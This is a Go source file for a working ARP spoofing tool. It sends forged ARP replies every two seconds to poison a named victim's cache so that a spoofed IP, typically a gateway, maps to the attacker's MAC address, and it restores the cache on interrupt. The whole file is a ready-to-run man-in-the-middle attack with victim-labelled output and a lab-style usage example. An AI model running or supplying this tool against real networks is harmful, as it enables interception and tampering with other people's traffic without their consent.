package main

import (
	"context"
	"fmt"
	"net"
	"net/netip"
	"os"
	"os/signal"
	"time"

	"github.com/mdlayher/arp"
)

const macAddrLen = 6

func getInterface(ifname string) (*net.Interface, netip.Addr, error) {
	iface, err := net.InterfaceByName(ifname)
	if err != nil {
		return nil, netip.Addr{}, err
	}
	if len(iface.HardwareAddr) != macAddrLen {
		return nil, netip.Addr{}, fmt.Errorf("invalid MAC address for %s", ifname)
	}

	addrs, err := iface.Addrs()
	if err != nil {
		return nil, netip.Addr{}, err
	}
	for _, addr := range addrs {
		prefix, err := netip.ParsePrefix(addr.String())
		if err != nil {
			continue
		}
		if ip := prefix.Addr(); ip.Is4() {
			return iface, ip, nil
		}
	}

	return nil, netip.Addr{}, fmt.Errorf("no IPv4 address found for %s", ifname)
}

func parseIPv4(s string) (netip.Addr, error) {
	ip, err := netip.ParseAddr(s)
	if err != nil || !ip.Is4() {
		return netip.Addr{}, fmt.Errorf("invalid IPv4 address: %s", s)
	}
	return ip, nil
}

func resolveMAC(client *arp.Client, ip netip.Addr, macStr string) (net.HardwareAddr, error) {
	if macStr != "" {
		mac, err := net.ParseMAC(macStr)
		if err != nil {
			return nil, fmt.Errorf("invalid target MAC: %w", err)
		}
		return mac, nil
	}

	mac, err := client.Resolve(ip)
	if err != nil {
		return nil, fmt.Errorf("resolve MAC for %s: %w", ip, err)
	}
	return mac, nil
}

func writeARPReply(client *arp.Client, srcMAC net.HardwareAddr, srcIP netip.Addr, dstMAC net.HardwareAddr, dstIP netip.Addr) error {
	packet, err := arp.NewPacket(arp.OperationReply, srcMAC, srcIP, dstMAC, dstIP)
	if err != nil {
		return err
	}
	return client.WriteTo(packet, dstMAC)
}

func restoreARP(client *arp.Client, spoofedMAC net.HardwareAddr, spoofedIP netip.Addr, victimMAC net.HardwareAddr, victimIP netip.Addr) {
	fmt.Println("[*] Restoring victim ARP cache...")
	for i := 0; i < 3; i++ {
		if err := writeARPReply(client, spoofedMAC, spoofedIP, victimMAC, victimIP); err != nil {
			fmt.Fprintf(os.Stderr, "restore ARP reply: %v\n", err)
		}
		time.Sleep(300 * time.Millisecond)
	}
}

func run(ifname, victimIPStr, spoofedIPStr, victimMACStr, spoofedMACStr string) error {
	iface, myIP, err := getInterface(ifname)
	if err != nil {
		return fmt.Errorf("failed to get local MAC/IP for %s: %w", ifname, err)
	}

	victimIP, err := parseIPv4(victimIPStr)
	if err != nil {
		return err
	}
	spoofedIP, err := parseIPv4(spoofedIPStr)
	if err != nil {
		return err
	}

	client, err := arp.Dial(iface)
	if err != nil {
		return fmt.Errorf("arp dial %s: %w\nHint: run as root or with CAP_NET_RAW", ifname, err)
	}
	defer client.Close()

	victimMAC, err := resolveMAC(client, victimIP, victimMACStr)
	if err != nil {
		return err
	}
	spoofedMAC, err := resolveMAC(client, spoofedIP, spoofedMACStr)
	if err != nil {
		return err
	}

	ctx, stop := signal.NotifyContext(context.Background(), os.Interrupt)
	defer stop()

	fmt.Printf("[*] Local MAC : %s\n", iface.HardwareAddr)
	fmt.Printf("[*] Local IP  : %s\n", myIP)
	fmt.Printf("[*] Victim    : %s / %s\n", victimIP, victimMAC)
	fmt.Printf("[*] Spoofed IP: %s / real MAC %s\n", spoofedIP, spoofedMAC)
	fmt.Printf("[*] Sending ARP replies: %s is at %s\n", spoofedIP, iface.HardwareAddr)
	fmt.Println("[*] Press Ctrl+C to restore ARP cache and exit")

	ticker := time.NewTicker(2 * time.Second)
	defer ticker.Stop()

	for {
		if err := writeARPReply(client, iface.HardwareAddr, spoofedIP, victimMAC, victimIP); err != nil {
			fmt.Fprintf(os.Stderr, "send ARP reply: %v\n", err)
		} else {
			fmt.Printf("[+] Sent: %s is at %s -> %s\n", spoofedIP, iface.HardwareAddr, victimIP)
		}

		select {
		case <-ctx.Done():
			restoreARP(client, spoofedMAC, spoofedIP, victimMAC, victimIP)
			return nil
		case <-ticker.C:
		}
	}
}

func main() {
	if len(os.Args) != 4 && len(os.Args) != 6 {
		fmt.Fprintf(os.Stderr, "Usage: %s <interface> <victim_ip> <spoofed_ip> [victim_mac spoofed_mac]\n", os.Args[0])
		fmt.Fprintf(os.Stderr, "Example: sudo %s eth0 192.168.56.101 192.168.56.1\n", os.Args[0])
		os.Exit(1)
	}

	victimMAC := ""
	spoofedMAC := ""
	if len(os.Args) == 6 {
		victimMAC = os.Args[4]
		spoofedMAC = os.Args[5]
	}

	if err := run(os.Args[1], os.Args[2], os.Args[3], victimMAC, spoofedMAC); err != nil {
		fmt.Fprintln(os.Stderr, err)
		os.Exit(1)
	}
}
